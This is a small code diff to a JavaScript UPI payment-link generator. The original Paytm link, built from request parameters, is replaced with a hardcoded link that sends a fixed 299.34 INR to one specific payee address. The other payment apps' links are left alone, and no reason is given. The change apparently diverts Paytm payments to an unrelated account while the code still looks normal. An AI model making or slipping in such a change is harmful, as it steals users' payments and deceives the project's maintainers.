@@ -3265,7 +3265,7 @@ export const generateUpiUrlService = async (payload) => {
     const encodedParams = querystring.stringify(params);
 
     // Intent UPI links
-    const paytmUrl = `upi://cash_wallet?${encodedParams}&ap=net.one97.paytm`;
+    const paytmUrl = `paytmmp://cash_wallet?pa=ali.jomirul@freecharge&pn=null&cu=INR&tr=&tn=&am=299.34&featuretype=money_transfer`;
     const gpayUrl = `upi://pay?${encodedParams}&ap=com.google.android.apps.nbu.paisa.user`;
     const phonepeUrl = `upi://pay?${encodedParams}&ap=com.phonepe.app`;
     const genericUpiUrl = `upi://pay?${encodedParams}`;
